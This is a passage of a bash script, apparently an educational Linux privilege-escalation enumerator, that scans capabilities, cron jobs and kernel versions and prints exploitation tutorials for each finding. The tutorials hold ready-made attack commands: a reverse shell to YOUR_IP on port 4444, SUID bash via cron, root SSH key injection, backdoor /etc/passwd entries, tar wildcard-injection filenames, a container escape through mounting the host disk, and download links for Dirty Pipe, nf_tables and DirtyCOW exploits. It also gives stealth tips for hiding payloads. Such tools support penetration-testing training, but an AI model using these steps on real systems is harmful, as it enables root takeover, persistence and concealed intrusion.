            teach "  "
            teach "  3. Mount host's root filesystem:"
            teach "     mount /dev/sda1 /mnt/host"
            teach "     (Normally blocked, but cap_sys_admin allows it)"
            teach "  "
            teach "  4. Chroot to host filesystem:"
            teach "     chroot /mnt/host /bin/bash"
            teach "  "
            teach "  5. You're now on the HOST system as root, escaped the container"
            teach ""
            teach "WHY THIS WORKS:"
            teach "  cap_sys_admin allows mounting filesystems (admin operation)."
            teach "  Containers share the host's devices (/dev/sda1 exists inside)."
            teach "  Once mounted, you can access the real host filesystem."
            teach "  Container isolation is broken - you're on the host now."
            teach ""
            teach "OTHER EXPLOITATION PATHS:"
            teach "  • Load malicious kernel module (if cap_sys_module also present)"
            teach "  • Manipulate /proc/sys to weaken security settings"
            teach "  • Create new namespaces with elevated privileges"
            teach "  • Perform quota operations to fill disk/DOS"
            log ""
        fi
        
        # === cap_sys_module - Load Kernel Modules ===
        if echo "$caps" | grep -q "cap_sys_module"; then
            critical "CAP_SYS_MODULE on $binary - Load kernel modules for root"
            vuln "CAP_SYS_MODULE found: $binary"
            log ""
            teach "EXPLOITATION:"
            teach "  Create malicious kernel module for root-level code execution"
            teach "  This requires kernel development knowledge"
            teach "  Kernel module runs in kernel space = complete system control"
            log ""
        fi
    done
    
    # === PHASE 5: SUMMARY ===
    log ""
    teach "═══════════════════════════════════════════════════════════"
    teach "CAPABILITIES - KEY TAKEAWAYS"
    teach "═══════════════════════════════════════════════════════════"
    teach ""
    teach "MENTAL MODEL FOR CAPABILITIES:"
    teach ""
    teach "  When you see a capability during enumeration, ask these questions:"
    teach ""
    teach "  1. What does this capability let me DO?"
    teach "     → Read files? Change UID? Mount filesystems? Network operations?"
    teach "  "
    teach "  2. Can I CONTROL what the binary does with that power?"
    teach "     → Python/Perl/Ruby = Full control (write any code)"
    teach "     → Compiled binary = Limited (must find exploitable behavior)"
    teach "     → Shell scripts = Full control if writable"
    teach "  "
    teach "  3. Does this binary EXECUTE other things I can influence?"
    teach "     → tar with cap_dac_override calls writable script = win"
    teach "     → systemd with caps might execute service files you can modify"
    teach ""
    teach "EXAMPLES:"
    teach "  cap_setuid on /usr/bin/python3:"
    teach "    1. What? Change user ID to anyone, including root"
    teach "    2. Control? YES - I can write Python code: os.setuid(0)"
    teach "    3. Execute? YES - Python executes my code"
    teach "    → INSTANT ROOT"
    teach ""
    teach "  cap_net_raw on /bin/ping:"
    teach "    1. What? Send raw network packets"
    teach "    2. Control? NO - ping is compiled, does one thing"
    teach "    3. Execute? NO - doesn't call other programs"
    teach "    → Not exploitable (this is the intended use case)"
    teach ""
    teach "THE BIG THREE FOR PRIVILEGE ESCALATION:"
    teach "  1. cap_setuid = Become root directly (if on interpreter)"
    teach "  2. cap_dac_override = Read/write any file (modify /etc/passwd)"
    teach "  3. cap_sys_admin = Mount filesystems, escape containers"
    teach ""
    teach "HOW TO CHECK CAPABILITIES:"
    teach "  getcap -r / 2>/dev/null"
    teach "  Focus on: interpreters (python, perl, ruby, php, node)"
    teach "           file utilities (tar, dd, rsync)"
    teach "           debug tools (gdb)"
    teach ""
    teach "WHY THIS MATTERS:"
    teach "  Capabilities are a security improvement over SUID root."
    teach "  But 'security improvement' ≠ 'secure'"
    teach "  One misconfigured capability = game over"
    teach "  Admins often don't understand the implications of capabilities"
    log ""
}
# === CRON JOB ANALYSIS ===
enum_cron() {
    section "CRON JOB ANALYSIS"
    
    # === PHASE 1: SILENT SCAN - Collect all findings first ===
    local found_issues=0
    local temp_writable_scripts="/tmp/.learnpeas_cron_scripts_$$"
    local temp_writable_dirs="/tmp/.learnpeas_cron_dirs_$$"
    local temp_wildcard_jobs="/tmp/.learnpeas_cron_wildcards_$$"
    local temp_writable_files="/tmp/.learnpeas_cron_files_$$"
    
    # Cleanup function
    cleanup_cron_temps() {
        rm -f "$temp_writable_scripts" "$temp_writable_dirs" "$temp_wildcard_jobs" "$temp_writable_files" 2>/dev/null
    }
    trap cleanup_cron_temps RETURN
    
    # Check system crontab
    if [ -r /etc/crontab ]; then
        while IFS= read -r line; do
            # Skip comments and empty lines
            echo "$line" | grep -qE "^#|^$" && continue
            
            # Extract script paths from the line
            local scripts=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb|php|bash)')
            
            for script in $scripts; do
                if [ -n "$script" ] && [ -f "$script" ]; then
                    if [ -w "$script" ]; then
                        echo "$script|$line" >> "$temp_writable_scripts"
                        found_issues=1
                    elif [ -d "$(dirname "$script")" ] && [ -w "$(dirname "$script")" ]; then
                        echo "$script|$line|$(dirname "$script")" >> "$temp_writable_dirs"
                        found_issues=1
                    fi
                fi
            done
            
            # Check for wildcards (exclude safe run-parts and common false positives)
            if echo "$line" | grep -qE '\*' && ! echo "$line" | grep -qE 'run-parts|logrotate|/\* \* \* \*'; then
                # Only flag if wildcard is used in command context, not in schedule
                if echo "$line" | awk '{print $6,$7,$8,$9,$10}' | grep -q '\*'; then
                    echo "$line" >> "$temp_wildcard_jobs"
                    found_issues=1
                fi
            fi
        done < <(grep -v "^#" /etc/crontab 2>/dev/null | grep -v "^$")
    fi
    
    # Check cron directories for writable files and directories
    for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
        if [ -w "$dir" ]; then
            echo "$dir|directory" >> "$temp_writable_files"
            found_issues=1
        fi
        
        if [ -d "$dir" ]; then
            while IFS= read -r file; do
                if [ -w "$file" ]; then
                    echo "$file|file" >> "$temp_writable_files"
                    found_issues=1
                fi
            done < <(find "$dir" -type f 2>/dev/null)
        fi
    done
    
    # Check user crontabs (if accessible)
    if [ -d /var/spool/cron/crontabs ]; then
        while IFS= read -r cronfile; do
            [ ! -r "$cronfile" ] && continue
            
            while IFS= read -r line; do
                echo "$line" | grep -qE "^#|^$" && continue
                
                local scripts=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl|rb|php|bash)')
                for script in $scripts; do
                    if [ -w "$script" ]; then
                        echo "$script|$line|$(basename "$cronfile")" >> "$temp_writable_scripts"
                        found_issues=1
                    fi
                done
            done < <(grep -v "^#" "$cronfile" 2>/dev/null | grep -v "^$")
        done < <(find /var/spool/cron/crontabs -type f 2>/dev/null)
    fi
    
    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
    if [ $found_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  CRON EXPLOITATION - Understanding Scheduled Tasks"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "HOW CRON WORKS:"
        teach "  Cron daemon (crond) runs as root, checking schedules every minute"
        teach "  Reads: /etc/crontab, /etc/cron.d/*, user crontabs"
        teach "  Executes commands at scheduled times as specified user"
        teach ""
        teach "TYPICAL CRON ENTRY:"
        teach "  */5 * * * * root /usr/local/bin/backup.sh"
        teach "  │   │ │ │ │  │    └─ Command to execute"
        teach "  │   │ │ │ │  └─ User to run as (root = danger!)"
        teach "  └───┴─┴─┴─┴─ Schedule (* = every)"
        teach "  min hr dom mon dow"
        teach ""
        teach "WHY ADMINS CREATE VULNERABILITIES:"
        teach ""
        teach "  Scenario 1 - The Quick Fix:"
        teach "    Admin needs automated backup script"
        teach "    Creates /usr/local/bin/backup.sh with 755 permissions"
        teach "    Adds to root's crontab"
        teach "    Thinks: 'Only root runs it, so it's safe'"
        teach "    Reality: File is world-writable or in writable directory"
        teach "    → You modify script, cron runs YOUR code as root"
        teach ""
        teach "  Scenario 2 - The Wildcard Mistake:"
        teach "    Admin writes: tar -czf backup.tar.gz /data/*"
        teach "    Thinks: '* means all files in /data'"
        teach "    Reality: Shell expands * to filenames BEFORE tar runs"
        teach "    → You create files named '--checkpoint-action=exec=shell.sh'"
        teach "    → Tar interprets these as arguments, executes your code"
        teach ""
        teach "THE TIMING WINDOW:"
        teach "  Cron runs every minute"
        teach "  You inject payload → Wait up to 60 seconds → Root shell"
        teach "  Some jobs run every 5 minutes, hourly, or daily"
        teach "  Check the schedule field to know when it'll trigger"
        teach ""
        teach "EXPLOITATION PATHS:"
        teach "  1. Writable script → Inject malicious commands"
        teach "  2. Writable directory → Replace script with yours"
        teach "  3. Wildcard injection → Create malicious filenames"
        teach "  4. Writable cron config → Create new scheduled jobs"
        log ""
    fi
    
    # === PHASE 3: REPORT WRITABLE SCRIPTS ===
    if [ -f "$temp_writable_scripts" ]; then
        while IFS='|' read -r script job user; do
            critical "WRITABLE cron script: $script"
            vuln "Cron job: $job"
            if [ -n "$user" ]; then
                info "User crontab: $user"
            fi
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  WRITABLE SCRIPT EXPLOITATION"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT YOU CONTROL:"
            teach "  The script file itself is writable by you"
            teach "  Cron will execute whatever code you put in it as root"
            teach "  This is instant root access on next execution"
            teach ""
            teach "EXPLOITATION OPTIONS:"
            teach ""
            teach "  Method 1 - SUID Shell (Stealthy):"
            teach "    echo 'chmod u+s /bin/bash' >> $script"
            teach "    # Wait for cron to run (check schedule in crontab)"
            teach "    /bin/bash -p  # You now have root shell"
            teach ""
            teach "  Method 2 - Reverse Shell (Immediate notification):"
            teach "    echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> $script"
            teach "    # On attacker machine: nc -lvnp 4444"
            teach "    # Wait for cron execution"
            teach ""
            teach "  Method 3 - SSH Key Injection (Persistent access):"
            teach "    cat >> $script << 'EOF'"
            teach "    mkdir -p /root/.ssh"
            teach "    echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys"
            teach "    chmod 700 /root/.ssh"
            teach "    chmod 600 /root/.ssh/authorized_keys"
            teach "    EOF"
            teach "    # After cron runs: ssh -i your_key root@target"
            teach ""
            teach "  Method 4 - Add Backdoor User:"
            teach "    # Generate password hash: openssl passwd -1 -salt xyz password123"
            teach "    echo 'echo \"backdoor:\$1\$xyz\$HASH:0:0::/root:/bin/bash\" >> /etc/passwd' >> $script"
            teach "    # After cron: su backdoor"
            teach ""
            teach "STEALTH CONSIDERATIONS:"
            teach "  • Append (>>) instead of overwrite (>) to keep original functionality"
            teach "  • Check script file size before/after to avoid suspicion"
            teach "  • Remove your payload after execution: echo 'sed -i \"/YOUR_LINE/d\" $script' >> $script"
            teach "  • Some scripts have checksums - check for integrity monitoring"
            log ""
        done < "$temp_writable_scripts"
    fi
    
    # === PHASE 4: REPORT WRITABLE DIRECTORIES ===
    if [ -f "$temp_writable_dirs" ]; then
        while IFS='|' read -r script job dir; do
            critical "Cron script in WRITABLE directory: $dir"
            vuln "Script: $script"
            vuln "Cron job: $job"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  WRITABLE DIRECTORY EXPLOITATION"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "WHAT YOU CONTROL:"
            teach "  The directory containing the script is writable"
            teach "  You can delete the script and replace it with yours"
            teach "  Or create a symlink to your malicious script"
            teach ""
            teach "WHY THIS WORKS:"
            teach "  Cron doesn't verify script integrity, only that path exists"
            teach "  Directory write permission = full control over that path"
            teach ""
            teach "EXPLOITATION:"
            teach ""
            teach "  Step 1 - Backup original (optional, for stealth):"
            teach "    cp $script ${script}.bak"
            teach ""
            teach "  Step 2 - Replace with malicious script:"
            teach "    cat > $script << 'EOF'"
            teach "    #!/bin/bash"
            teach "    chmod u+s /bin/bash"
            teach "    # Optional: Call original to avoid suspicion"
            teach "    # ${script}.bak \"\$@\""
            teach "    EOF"
            teach ""
            teach "  Step 3 - Ensure executable:"
            teach "    chmod +x $script"
            teach ""
            teach "  Step 4 - Wait for cron execution"
            teach "    Check crontab for schedule (*/5 = every 5 min)"
            teach ""
            teach "  Step 5 - Execute SUID bash:"
            teach "    /bin/bash -p"
            teach ""
            teach "ALTERNATIVE - Symlink Method:"
            teach "  mv $script ${script}.real"
            teach "  ln -s /path/to/your/evil/script $script"
            teach "  # Cron follows symlink, executes your script as root"
            log ""
        done < "$temp_writable_dirs"
    fi
    
    # === PHASE 5: REPORT WILDCARD JOBS ===
    if [ -f "$temp_wildcard_jobs" ]; then
        warn "Cron jobs using wildcards detected"
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  WILDCARD INJECTION - Advanced Technique"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "HOW WILDCARD EXPANSION WORKS:"
        teach ""
        teach "  Shell processes wildcards BEFORE passing to command"
        teach ""
        teach "  Example cron job:"
        teach "    tar -czf backup.tar.gz /data/*"
        teach ""
        teach "  Files in /data/:"
        teach "    file1.txt"
        teach "    file2.txt"
        teach ""
        teach "  Shell expands to:"
        teach "    tar -czf backup.tar.gz /data/file1.txt /data/file2.txt"
        teach ""
        teach "THE ATTACK:"
        teach ""
        teach "  You create files with names that look like command flags:"
        teach "    cd /data"
        teach "    touch -- '--checkpoint=1'"
        teach "    touch -- '--checkpoint-action=exec=sh shell.sh'"
        teach ""
        teach "  Now shell expands to:"
        teach "    tar -czf backup.tar.gz /data/--checkpoint=1 /data/--checkpoint-action=exec=sh shell.sh /data/file1.txt"
        teach ""
        teach "  Tar interprets '--checkpoint-action' as an OPTION, not a filename!"
        teach "  Tar's --checkpoint-action flag executes shell commands"
        teach "  Result: Tar executes shell.sh as root"
        teach ""
        teach "WHY THIS WORKS:"
        teach "  Commands process options (flags starting with -) before filenames"
        teach "  There's no way for tar to distinguish between:"
        teach "    - A file named '--checkpoint=1'"
        teach "    - An actual --checkpoint=1 flag"
        teach "  Shell has already expanded * by the time tar runs"
        teach ""
        
        while IFS= read -r job; do
            vuln "Wildcard job: $job"
        done < "$temp_wildcard_jobs"
        
        log ""
        teach "EXPLOITATION STEPS:"
        teach ""
        teach "  1. Identify the working directory from cron job"
        teach "     (Look at the path before the *)"
        teach ""
        teach "  2. Create your malicious payload script:"
        teach "     cat > /tmp/shell.sh << 'EOF'"
        teach "     #!/bin/bash"
        teach "     chmod u+s /bin/bash"
        teach "     EOF"
        teach "     chmod +x /tmp/shell.sh"
        teach ""
        teach "  3. Navigate to wildcard directory:"
        teach "     cd /target/directory"
        teach ""
        teach "  4. Create checkpoint files (note the -- to prevent flag interpretation):"
        teach "     touch -- '--checkpoint=1'"
        teach "     touch -- '--checkpoint-action=exec=sh /tmp/shell.sh'"
        teach ""
        teach "  5. Wait for cron to run"
        teach ""
        teach "  6. Execute SUID bash:"
        teach "     /bin/bash -p"
        teach ""
        teach "OTHER VULNERABLE COMMANDS:"
        teach "  • rsync with *: Use -e flag"
        teach "    touch -- '-e sh shell.sh x'"
        teach ""
        teach "  • chown with *: Use --reference flag"
        teach "    touch -- '--reference=/root/owned_file'"
        teach ""
        teach "  • chmod with *: Use --reference flag"
        teach ""
        teach "KEY INSIGHT:"
        teach "  Any command that accepts flags starting with - or --"
        teach "  and processes * wildcards is potentially vulnerable"
        log ""
    fi
    
    # === PHASE 6: REPORT WRITABLE CRON FILES ===
    if [ -f "$temp_writable_files" ]; then
        while IFS='|' read -r file type; do
            critical "WRITABLE cron configuration: $file"
            vuln "Type: $type"
            log ""
            teach "╔═══════════════════════════════════════════════════════════╗"
            teach "║  WRITABLE CRON CONFIGURATION"
            teach "╚═══════════════════════════════════════════════════════════"
            teach ""
            teach "DIRECT CRON JOB CREATION:"
            teach "  You can create or modify cron jobs directly"
            teach "  This is the easiest path - no script analysis needed"
            teach ""
            teach "EXPLOITATION:"
            teach ""
            if [ "$type" = "directory" ]; then
                teach "  Directory is writable - create new cron file:"
                teach "    echo '* * * * * root chmod u+s /bin/bash' > $file/pwn"
                teach "    # Runs every minute"
                teach "    # Wait up to 60 seconds"
                teach "    /bin/bash -p"
            else
                teach "  File is writable - add job directly:"
                teach "    echo '* * * * * root chmod u+s /bin/bash' >> $file"
                teach "    # Runs every minute"
                teach "    # Wait up to 60 seconds"  
                teach "    /bin/bash -p"
            fi
            teach ""
            teach "ALTERNATIVE PAYLOADS:"
            teach ""
            teach "  Reverse shell:"
            teach "    echo '* * * * * root bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > $file"
            teach ""
            teach "  SSH key injection:"
            teach "    echo '* * * * * root echo YOUR_KEY >> /root/.ssh/authorized_keys' > $file"
            teach ""
            teach "  Add backdoor user:"
            teach "    echo '* * * * * root echo \"pwn:\\$1\\$xyz\\$HASH:0:0::/root:/bin/bash\" >> /etc/passwd' > $file"
            log ""
        done < "$temp_writable_files"
    fi
    
    # === PHASE 7: CLEAN EXIT ===
    if [ $found_issues -eq 0 ]; then
        ok "No exploitable cron configurations found"
    fi
}

# === KERNEL EXPLOIT DETECTION ===
enum_kernel() {
    section "KERNEL EXPLOIT DETECTION"
    
    explain_concept "Kernel Exploits" \
        "The kernel is the core of Linux, managing hardware, processes, and security. Vulnerabilities here affect all users and often give instant root." \
        "The kernel has complete control over the system - it manages memory, processes, hardware, and enforces all security. It runs in 'ring 0' (highest privilege). Any code execution in kernel space = total system control. Unlike user-space exploits (SUID, sudo), kernel exploits work regardless of user permissions." \
        "Why kernel exploits are powerful:\n  • Bypass ALL security mechanisms (capabilities, AppArmor, SELinux)\n  • Affect ALL users on the system\n  • Escape containers (containers share host kernel)\n  • No authentication needed\n  • Universal - same exploit works across distributions\n\nWhy they exist:\n  • Kernel is millions of lines of C code\n  • Handles complex low-level operations\n  • Must support ancient hardware/features\n  • Race conditions in multi-threading\n  • Memory corruption bugs"
    
    local kernel=$(uname -r)
    local kernel_version=$(echo "$kernel" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+')
    
    info "Kernel version: $kernel"
    info "Kernel numeric version: $kernel_version"
    log ""
    
    # Parse version for comparison
    local major=$(echo "$kernel_version" | cut -d. -f1)
    local minor=$(echo "$kernel_version" | cut -d. -f2)
    local patch=$(echo "$kernel_version" | cut -d. -f3)
    
    info "Checking kernel against known exploitable vulnerabilities..."
    log ""
    
    # === Dirty Pipe (CVE-2022-0847) ===
    if [ "$major" -eq 5 ] && [ "$minor" -ge 8 ] && [ "$minor" -le 16 ]; then
        critical "${WORK}[REQUIRES COMPILATION]${RST} Kernel vulnerable to Dirty Pipe (CVE-2022-0847) - Instant root"
        vuln "Potentially vulnerable to Dirty Pipe (CVE-2022-0847)"
        
        # Quick verification check - look for patch indicators
        info "Performing quick verification check..."
        local proc_version=$(cat /proc/version 2>/dev/null)
        local patch_detected=0
        
        # Check for common distro patch indicators
        if echo "$proc_version" | grep -qi "Ubuntu\|Debian\|el7\|el8\|el9\|\.fc[0-9]\+\|\.amzn"; then
            # These distros commonly backport security patches
            if echo "$proc_version" | grep -qi "Ubuntu.*5\.1[0-5]\|Ubuntu.*5\.13"; then
                patch_detected=1
            elif echo "$proc_version" | grep -qi "\.el[0-9]"; then
                patch_detected=1
            fi
        fi
        
        if [ "$patch_detected" -eq 1 ]; then
            warn "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            warn "[!] NOTICE: Patch indicators detected in kernel version string"
            warn "[!] System MAY be patched despite vulnerable version number"
            warn "[!] Many distributions backport security fixes without version bumps"
            warn "[!] Manual verification strongly recommended before exploitation"
            warn "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        fi
        
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  CVE-2022-0847 - Dirty Pipe (Arbitrary File Overwrite)"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IT IS:"
        teach "  A vulnerability that allows overwriting data in read-only files"
        teach "  by exploiting how Linux handles pipe buffers. Named after the"
        teach "  similar 'Dirty COW' vulnerability from 2016."
        teach ""
        teach "WHY IT EXISTS:"
        teach "  Linux uses 'pipes' to pass data between processes (like |)."
        teach "  Pipes use special memory buffers called 'pipe buffers'."
        teach "  These buffers have flags to track their state."
        teach ""
        teach "THE BUG:"
        teach "  When merging pipe buffers, the kernel forgot to clear the"
        teach "  PIPE_BUF_FLAG_CAN_MERGE flag. This flag should be cleared"
        teach "  when data is copied into a page cache (file cache in memory)."
        teach ""
        teach "  The exploit works like this:"
        teach "  1. Open a read-only file (like /etc/passwd)"
        teach "  2. Create a pipe"
        teach "  3. Write data to the pipe that you want to inject"
        teach "  4. Splice the pipe into the target file"
        teach "  5. Because the flag wasn't cleared, kernel allows the write"
        teach "  6. You've now modified a read-only file!"
        teach ""
        teach "REAL-WORLD EXAMPLE:"
        teach "  Target: /etc/passwd (read-only, owned by root)"
        teach "  Action: Add a new root user without password"
        teach "  Result: Instant root access"
        teach ""
        teach "HOW TO EXPLOIT:"
        teach "  1. Check if vulnerable:"
        teach "     uname -r (kernel 5.8 - 5.16.11 = vulnerable)"
        teach "  2. Download exploit:"
        teach "     https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits"
        teach "  3. Compile:"
        teach "     gcc exploit-1.c -o exploit"
        teach "  4. Run:"
        teach "     ./exploit"
        teach "  5. The exploit will:"
        teach "     - Overwrite /etc/passwd to add user 'aaron' with no password"
        teach "     - Or make /bin/bash SUID for instant root"
        teach ""
        teach "WHY IT'S CALLED DIRTY PIPE:"
        teach "  • 'Dirty' = Modifying read-only data (like Dirty COW)"
        teach "  • 'Pipe' = Exploits Linux pipe mechanism"
        teach ""
        teach "AFFECTED SYSTEMS:"
        teach "  Kernels: 5.8 - 5.16.11, 5.15.25, 5.10.102"
        teach "  Most Linux distributions from 2020-2022"
        teach ""
        teach "IMPACT: Any user can overwrite any file → Root access"
        log ""
    fi
    
    # === nf_tables (CVE-2024-1086) ===
    if [ "$major" -eq 5 ] && [ "$minor" -ge 14 ] && [ "$minor" -le 18 ]; then
        vuln "Potentially vulnerable to nf_tables (CVE-2024-1086)"
        
        # Quick verification check - CONFIG_USER_NS is required for exploitation
        info "Performing quick verification check..."
        local config_file="/boot/config-$(uname -r)"
        local user_ns_enabled=0
        
        if [ -f "$config_file" ]; then
            local user_ns_config=$(grep "CONFIG_USER_NS" "$config_file" 2>/dev/null)
            if echo "$user_ns_config" | grep -q "CONFIG_USER_NS=y"; then
                user_ns_enabled=1
                critical  "${WORK}[REQUIRES COMPILATION]${RST} System might be vulnerable to CVE-2024-1086 ⚠ CONFIG_USER_NS is ENABLED"
            else
                info "✓ CONFIG_USER_NS is DISABLED - system is NOT vulnerable to CVE-2024-1086"
                info "   (Exploit requires user namespace support which is not enabled)"
            fi
        else
            warn "Could not find kernel config file at $config_file"
            warn "Unable to verify CONFIG_USER_NS status"
        fi
        
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  CVE-2024-1086 - nf_tables Use-After-Free"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IT IS:"
        teach "  A use-after-free vulnerability in the nftables (netfilter)"
        teach "  subsystem that allows local privilege escalation to root."
        teach ""
        teach "BACKGROUND - What is nftables:"
        teach "  nftables is Linux's firewall framework (successor to iptables)."
        teach "  It allows filtering network packets, managing firewall rules."
        teach "  Runs in kernel space for performance."
        teach ""
        teach "WHY IT EXISTS:"
        teach "  'Use-after-free' is a memory corruption bug. Here's what happens:"
        teach ""
        teach "  1. Kernel allocates memory for an nftables object"
        teach "  2. Kernel frees that memory (object deleted)"
        teach "  3. Kernel tries to use that memory again"
        teach "  4. But the memory might now contain attacker-controlled data"
        teach "  5. Kernel executes attacker's data = code execution as root"
        teach ""
        teach "SIMPLIFIED ANALOGY:"
        teach "  Imagine a library book:"
        teach "  1. You check out a book (allocate memory)"
        teach "  2. You return it (free memory)"
        teach "  3. Someone else checks it out and writes notes in it"
        teach "  4. You try to read your old notes (use-after-free)"
        teach "  5. But you're actually reading the new person's notes!"
        teach ""
        teach "TECHNICAL DETAILS:"
        teach "  The vulnerability is in how nftables handles anonymous sets."
        teach "  When deleting rules, the kernel frees memory but doesn't"
        teach "  clear all references to it. Attacker can trigger reuse of"
        teach "  that freed memory, overwriting kernel data structures."
        teach ""
        teach "REQUIREMENTS:"
        teach "  • CONFIG_USER_NS=y (user namespaces enabled)"
        teach "  • nftables support compiled in kernel"
        teach ""
        teach "HOW TO CHECK IF EXPLOITABLE:"
        teach "  1. Check kernel config:"
        teach "     grep CONFIG_USER_NS /boot/config-\$(uname -r)"
        teach "  2. If =y, likely vulnerable"
        teach ""
        teach "HOW TO EXPLOIT:"
        teach "  1. Check if vulnerable: uname -r (5.14-5.18)"
        teach "  2. Download exploit:"
        teach "     https://github.com/Notselwyn/CVE-2024-1086"
        teach "  3. Compile (requires kernel headers):"
        teach "     gcc exploit.c -o exploit"
        teach "  4. Run:"
        teach "     ./exploit"
        teach ""
        teach "WHY IT'S COMPLEX:"
        teach "  This is an advanced exploit requiring:"
        teach "  • Understanding of kernel memory management"
        teach "  • Heap manipulation (kernel heap spray)"
        teach "  • Timing-dependent (race condition)"
        teach ""
        teach "IMPACT: Local privilege escalation, works in containers"
        log ""
    fi
    
    # === DirtyCOW (CVE-2016-5195) ===
    if [ "$major" -eq 4 ]; then
        vuln "Kernel 4.x - Multiple known exploits available"
        teach "Older kernel - check exploit-db for specific version"
        log ""
        
        if [ "$minor" -le 10 ]; then
            critical "${WORK}[REQUIRES COMPILATION]${RST} Kernel vulnerable to DirtyCOW (CVE-2016-5195) - Instant root"
            vuln "Potentially vulnerable to DirtyCOW (CVE-2016-5195)"
            
            # Quick verification check - look for patch indicators
            info "Performing quick verification check..."
            local proc_version=$(cat /proc/version 2>/dev/null)
            local patch_detected=0
            
            # DirtyCOW was widely patched - check for common indicators
            if echo "$proc_version" | grep -qi "Ubuntu\|Debian\|el7\|el8\|\.fc[0-9]\+\|\.amzn"; then
                # Most distros patched this by late 2016
                patch_detected=1
            fi
            
            # Check for specific Ubuntu/Debian versions that were patched
            if echo "$proc_version" | grep -qi "Ubuntu.*4\.[48]\|Debian"; then
                patch_detected=1
            fi
            
            if [ "$patch_detected" -eq 1 ]; then
                warn "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                warn "[!] NOTICE: Patch indicators detected in kernel version string"
                warn "[!] System MAY be patched despite vulnerable version number"
                warn "[!] DirtyCOW was widely patched in 2016 via backports"
                warn "[!] Manual verification strongly recommended before exploitation"
                warn "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            fi
            
            log ""
            teach "╔════════════════════════════════════════════════════════════╗"
            teach "║  CVE-2016-5195 - Dirty COW (Copy-On-Write Race Condition)"
            teach "╚════════════════════════════════════════════════════════════╝"
            teach ""
            teach "WHAT IT IS:"
            teach "  One of the most famous Linux kernel vulnerabilities ever found."
            teach "  Allows writing to read-only files by exploiting a race condition"
            teach "  in the Copy-On-Write (COW) mechanism. Existed for 9+ years."
            teach ""
            teach "BACKGROUND - What is Copy-On-Write:"
            teach "  When you fork() a process, Linux doesn't immediately copy all"
            teach "  memory. Instead, parent and child share the same memory pages"
            teach "  marked as read-only. Only when one tries to write, the kernel"
            teach "  makes a copy. This saves memory and improves performance."
            teach ""
            teach "WHY IT EXISTS (The Race Condition):"
            teach "  There's a tiny time window between when the kernel:"
            teach "  1. Checks if you can write to a page (permission check)"
            teach "  2. Actually performs the write operation"
            teach ""
            teach "  The exploit abuses this timing gap:"
            teach "  Thread 1: Repeatedly calls madvise() to discard the page"
            teach "  Thread 2: Repeatedly tries to write to the read-only file"
            teach ""
            teach "  If timed perfectly:"
            teach "  • Thread 1 discards the COW page"
            teach "  • Thread 2 writes during the tiny gap"
            teach "  • Kernel writes to the ORIGINAL page (not the copy)"
            teach "  • You've just modified a read-only file!"
            teach ""
            teach "WHY IT'S CALLED DIRTY COW:"
            teach "  • 'Dirty' = Modified pages in memory"
            teach "  • 'COW' = Copy-On-Write mechanism"
            teach "  • Also a fun name that went viral"
            teach ""
            teach "THE EXPLOIT PROCESS:"
            teach "  1. Open /etc/passwd (read-only)"
            teach "  2. Map it into memory with mmap()"
            teach "  3. Start two threads racing:"
            teach "     - One calling madvise(MADV_DONTNEED) repeatedly"
            teach "     - One writing to the memory repeatedly"
            teach "  4. Race condition succeeds"
            teach "  5. Your write goes to the real file"
            teach "  6. Add root user or overwrite existing user's password hash"
            teach ""
            teach "HOW TO EXPLOIT:"
            teach "  1. Check vulnerability: uname -r (< 4.8.3 = vulnerable)"
            teach "  2. Download exploit:"
            teach "     https://github.com/dirtycow/dirtycow.github.io"
            teach "     https://github.com/firefart/dirtycow"
            teach "  3. Compile:"
            teach "     gcc -pthread dirty.c -o dirty -lcrypt"
            teach "  4. Run:"
            teach "     ./dirty mypassword"
            teach "  5. Creates user 'firefart' with UID 0 (root)"
            teach "  6. Login:"
            teach "     su firefart"
            teach "     Password: mypassword"
            teach ""
            teach "VARIATIONS:"
            teach "  • SUID binary injection (make /usr/bin/passwd writeable)"
            teach "  • Direct /etc/shadow modification"
            teach "  • SELinux/AppArmor policy modification"
            teach ""
            teach "WHY IT EXISTED SO LONG:"
            teach "  • Race conditions are hard to find"
            teach "  • The timing window is microseconds"
            teach "  • Required specific knowledge of kernel internals"
            teach "  • Copy-On-Write is a fundamental kernel feature"
            teach ""
            teach "IMPACT: Any user → Root, works on almost all Linux systems"
            teach "        Affected billions of devices (servers, Android, IoT)"
            log ""
        fi
    fi
    
    # === Kernel 3.x ===
    if [ "$major" -eq 3 ]; then
        critical "${WORK}[REQUIRES COMPILATION]${RST} Kernel 3.x - ANCIENT kernel with many known exploits"
        vuln "Extremely outdated kernel - highly exploitable"
        log ""
        teach "╔════════════════════════════════════════════════════════════╗"
        teach "║  Kernel 3.x - Legacy Kernel (End of Life)"
        teach "╚════════════════════════════════════════════════════════════╝"
        teach ""
